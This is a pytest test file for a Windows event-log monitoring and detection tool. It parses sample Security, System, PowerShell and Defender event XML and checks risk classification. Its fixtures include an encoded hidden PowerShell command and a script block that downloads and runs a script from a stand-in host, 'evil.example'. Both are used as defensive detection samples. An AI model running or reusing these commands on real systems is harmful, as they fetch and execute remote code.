import datetime as dt
from pathlib import Path

import pytest
from sqlalchemy import select

from config.settings import MonitoringConfig, RiskConfig
from database.engine import create_db_engine, create_session_factory
from database.models import Base, Event
from detection.log_analysis import classify_log_event
from monitors.log_monitor import LogMonitor, RawLogEvent, _parse_iso_timestamp, parse_event_xml

RISK = RiskConfig()


# --- Realistic sample XML, matching the documented Windows Event Log
# XML rendering schema (EvtRenderEventXml). ------------------------------

_XML_4688_PROCESS_CREATION = """<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Security-Auditing" />
    <EventID>4688</EventID>
    <TimeCreated SystemTime="2026-08-22T13:00:00.1234567Z" />
    <EventRecordID>123456</EventRecordID>
    <Channel>Security</Channel>
    <Computer>DESKTOP-ABC123</Computer>
  </System>
  <EventData>
    <Data Name="SubjectUserName">alice</Data>
    <Data Name="NewProcessId">0x1a2b</Data>
    <Data Name="NewProcessName">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>
    <Data Name="ParentProcessName">C:\\Windows\\explorer.exe</Data>
    <Data Name="ProcessCommandLine">powershell.exe -nop -w hidden -EncodedCommand SQBFAFgA</Data>
  </EventData>
</Event>"""

_XML_4625_LOGON_FAILED = """<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <EventID>4625</EventID>
    <TimeCreated SystemTime="2026-08-22T13:05:00.0000000Z" />
    <Computer>DESKTOP-ABC123</Computer>
  </System>
  <EventData>
    <Data Name="TargetUserName">bob</Data>
    <Data Name="TargetDomainName">DESKTOP-ABC123</Data>
  </EventData>
</Event>"""

_XML_7045_SERVICE_INSTALLED = """<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <EventID>7045</EventID>
    <TimeCreated SystemTime="2026-08-22T13:10:00.0000000Z" />
    <Computer>DESKTOP-ABC123</Computer>
  </System>
  <EventData>
    <Data Name="ServiceName">WindowsUpdateHelper</Data>
    <Data Name="ImagePath">C:\\Users\\alice\\AppData\\Local\\Temp\\svc.exe</Data>
    <Data Name="StartType">auto start</Data>
  </EventData>
</Event>"""

# PowerShell/Defender operational logs typically render via UserData
# with a provider-specific schema rather than plain EventData.
_XML_4104_SCRIPT_BLOCK = """<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <EventID>4104</EventID>
    <TimeCreated SystemTime="2026-08-22T13:15:00.0000000Z" />
    <Computer>DESKTOP-ABC123</Computer>
  </System>
  <UserData>
    <ContextInfo xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
      <ScriptBlockText>IEX (New-Object Net.WebClient).DownloadString('http://evil.example/p.ps1')</ScriptBlockText>
      <Path>-</Path>
    </ContextInfo>
  </UserData>
</Event>"""

_XML_1116_DEFENDER_DETECTED = """<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <EventID>1116</EventID>
    <TimeCreated SystemTime="2026-08-22T13:20:00.0000000Z" />
    <Computer>DESKTOP-ABC123</Computer>
  </System>
  <EventData>
    <Data Name="Threat Name">Trojan:Win32/Wacatac.B</Data>
    <Data Name="Severity Name">Severe</Data>
  </EventData>
</Event>"""

_XML_UNKNOWN_EVENT_ID = """<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <EventID>9999</EventID>
    <TimeCreated SystemTime="2026-08-22T13:25:00.0000000Z" />
    <Computer>DESKTOP-ABC123</Computer>
  </System>
  <EventData />
</Event>"""


# --- XML parsing ---------------------------------------------------------


def test_parse_event_xml_extracts_event_data_fields() -> None:
    parsed = parse_event_xml(_XML_4688_PROCESS_CREATION)
    assert parsed.event_id == 4688
    assert parsed.host == "DESKTOP-ABC123"
    assert parsed.fields["SubjectUserName"] == "alice"
    assert "powershell.exe" in parsed.fields["NewProcessName"]
    assert "-EncodedCommand" in parsed.fields["ProcessCommandLine"]
    assert parsed.timestamp == dt.datetime(2026, 8, 22, 13, 0, 0, 123456)


def test_parse_event_xml_extracts_userdata_fields() -> None:
    parsed = parse_event_xml(_XML_4104_SCRIPT_BLOCK)
    assert parsed.event_id == 4104
    assert "DownloadString" in parsed.fields["ScriptBlockText"]


def test_parse_event_xml_handles_missing_time_precision() -> None:
    parsed = parse_event_xml(_XML_4625_LOGON_FAILED)
    assert parsed.timestamp == dt.datetime(2026, 8, 22, 13, 5, 0)


@pytest.mark.parametrize(
    "value, expected",
    [
        ("2026-08-22T13:00:00.1234567Z", dt.datetime(2026, 8, 22, 13, 0, 0, 123456)),
        ("2026-08-22T13:00:00Z", dt.datetime(2026, 8, 22, 13, 0, 0)),
        ("2026-08-22T13:00:00.1Z", dt.datetime(2026, 8, 22, 13, 0, 0, 100000)),
    ],
)
def test_parse_iso_timestamp_precision_variants(value: str, expected: dt.datetime) -> None:
    assert _parse_iso_timestamp(value) == expected


# --- Classification -------------------------------------------------------


def test_classify_process_creation_with_suspicious_cmdline() -> None:
    parsed = parse_event_xml(_XML_4688_PROCESS_CREATION)
    result = classify_log_event(parsed.event_id, parsed.fields, RISK)
    assert result.event_type == "security_process_creation"
    assert result.user == "alice"
    assert result.risk > 0
    assert result.severity in ("low", "medium", "high", "critical")


def test_classify_benign_process_creation_has_no_detection() -> None:
    fields = {"SubjectUserName": "alice", "NewProcessName": "notepad.exe", "ProcessCommandLine": "notepad.exe"}
    result = classify_log_event(4688, fields, RISK)
    assert result.risk == 0
    assert result.reasons == ["No detection"]


def test_classify_logon_failed() -> None:
    parsed = parse_event_xml(_XML_4625_LOGON_FAILED)
    result = classify_log_event(parsed.event_id, parsed.fields, RISK)
    assert result.event_type == "security_logon_failed"
    assert result.user == "bob"


def test_classify_service_installed() -> None:
    parsed = parse_event_xml(_XML_7045_SERVICE_INSTALLED)
    result = classify_log_event(parsed.event_id, parsed.fields, RISK)
    assert result.event_type == "system_service_installed"
    assert "svc.exe" in result.process


def test_classify_powershell_script_block_with_suspicious_content() -> None:
    parsed = parse_event_xml(_XML_4104_SCRIPT_BLOCK)
    result = classify_log_event(parsed.event_id, parsed.fields, RISK)
    assert result.event_type == "powershell_script_block"
    assert result.risk > 0
    assert "DownloadString" in result.reasons[0] or "downloadstring" in result.reasons[0].lower()


def test_classify_defender_detection_is_high_risk() -> None:
    parsed = parse_event_xml(_XML_1116_DEFENDER_DETECTED)
    result = classify_log_event(parsed.event_id, parsed.fields, RISK)
    assert result.event_type == "defender_threat_detected"
    assert "Wacatac" in result.reasons[0]
    assert result.severity in ("high", "critical")


def test_classify_unknown_event_id_returns_none() -> None:
    assert classify_log_event(9999, {}, RISK) is None


# --- Monitor: snapshot/diff/write using an injected fake reader --------


@pytest.fixture()
def session_factory(tmp_path: Path):
    engine = create_db_engine(tmp_path / "test.db")
    Base.metadata.create_all(engine)
    return create_session_factory(engine)


def _raw(event_id: int, fields: dict, minute: int) -> RawLogEvent:
    return RawLogEvent(
        channel="Security",
        event_id=event_id,
        timestamp=dt.datetime(2026, 8, 22, 13, minute, 0),
        host="DESKTOP-ABC123",
        fields=fields,
    )


def test_write_one_persists_normalized_event(session_factory) -> None:
    monitor = LogMonitor(session_factory, MonitoringConfig(), RISK, reader=lambda *a: [], channels={})
    raw = _raw(4688, {"SubjectUserName": "alice", "NewProcessName": "cmd.exe", "ProcessCommandLine": "cmd.exe"}, 0)

    with session_factory() as session:
        monitor._write_one(session, raw)
        session.commit()

        event = session.execute(select(Event).where(Event.event_type == "security_process_creation")).scalars().one()
        assert event.source == "log:Security"
        assert event.host == "DESKTOP-ABC123"
        assert event.user == "alice"
        assert event.details["event_id"] == 4688
        assert "reasons" in event.details


def test_write_one_skips_unclassifiable_event_id(session_factory) -> None:
    monitor = LogMonitor(session_factory, MonitoringConfig(), RISK, reader=lambda *a: [], channels={})
    raw = _raw(9999, {}, 0)

    with session_factory() as session:
        monitor._write_one(session, raw)
        session.commit()
        count = session.execute(select(Event)).scalars().all()
        assert count == []


def test_poll_once_advances_since_cursor_and_queues_events(session_factory, monkeypatch) -> None:
    calls = []

    def fake_reader(channel, event_ids, since):
        calls.append((channel, since))
        return [_raw(4625, {"TargetUserName": "bob"}, 5)]

    monitor = LogMonitor(
        session_factory, MonitoringConfig(), RISK, reader=fake_reader, channels={"Security": (4625,)}
    )
    monitor._since = {"Security": dt.datetime(2026, 8, 22, 13, 0, 0)}

    seen = []
    monkeypatch.setattr(monitor._writer, "put", lambda item: seen.append(item))

    monitor._poll_once()

    assert len(seen) == 1
    assert monitor._since["Security"] == dt.datetime(2026, 8, 22, 13, 5, 0)
    assert calls == [("Security", dt.datetime(2026, 8, 22, 13, 0, 0))]


def test_poll_once_survives_a_failing_reader(session_factory, monkeypatch) -> None:
    def broken_reader(channel, event_ids, since):
        raise RuntimeError("simulated reader failure")

    def good_reader(channel, event_ids, since):
        return [_raw(4625, {"TargetUserName": "bob"}, 1)]

    monitor = LogMonitor(
        session_factory,
        MonitoringConfig(),
        RISK,
        reader=lambda channel, *a: (broken_reader if channel == "Broken" else good_reader)(channel, *a),
        channels={"Broken": (1,), "Security": (4625,)},
    )
    monitor._since = {
        "Broken": dt.datetime(2026, 8, 22, 13, 0, 0),
        "Security": dt.datetime(2026, 8, 22, 13, 0, 0),
    }

    seen = []
    monkeypatch.setattr(monitor._writer, "put", lambda item: seen.append(item))

    monitor._poll_once()  # must not raise despite the "Broken" channel failing
    assert len(seen) == 1


def test_start_seeds_since_to_now_for_every_channel(session_factory) -> None:
    monitor = LogMonitor(
        session_factory, MonitoringConfig(), RISK, reader=lambda *a: [], channels={"Security": (4625,), "System": (7045,)}
    )
    before = dt.datetime.now(dt.timezone.utc).replace(tzinfo=None)
    monitor.start()
    try:
        after = dt.datetime.now(dt.timezone.utc).replace(tzinfo=None)
        assert set(monitor._since.keys()) == {"Security", "System"}
        for ts in monitor._since.values():
            assert before <= ts <= after
    finally:
        monitor.stop()


def test_log_monitor_end_to_end_with_fake_reader(tmp_path: Path) -> None:
    """Real thread + QueueWriter machinery, using an injected fake
    reader since win32evtlog doesn't exist on this platform."""
    import time

    engine = create_db_engine(tmp_path / "test.db")
    Base.metadata.create_all(engine)
    session_factory = create_session_factory(engine)

    state = {"events": []}

    def fake_reader(channel, event_ids, since):
        return state["events"]

    monitor = LogMonitor(
        session_factory,
        MonitoringConfig(log_poll_interval_seconds=0.2),
        RiskConfig(),
        reader=fake_reader,
        channels={"Security": (4688,)},
    )
    monitor.start()
    try:
        time.sleep(0.3)
        state["events"] = [
            RawLogEvent(
                channel="Security",
                event_id=4688,
                timestamp=dt.datetime.now(dt.timezone.utc).replace(tzinfo=None),
                host="DESKTOP-ABC123",
                fields={"SubjectUserName": "alice", "NewProcessName": "cmd.exe", "ProcessCommandLine": "cmd.exe"},
            )
        ]

        deadline = time.monotonic() + 5.0
        found = False
        while time.monotonic() < deadline:
            with session_factory() as session:
                match = session.execute(
                    select(Event).where(Event.event_type == "security_process_creation")
                ).scalars().first()
                if match is not None:
                    found = True
                    break
            time.sleep(0.2)
        assert found, "expected the log event to be recorded"
    finally:
        monitor.stop()
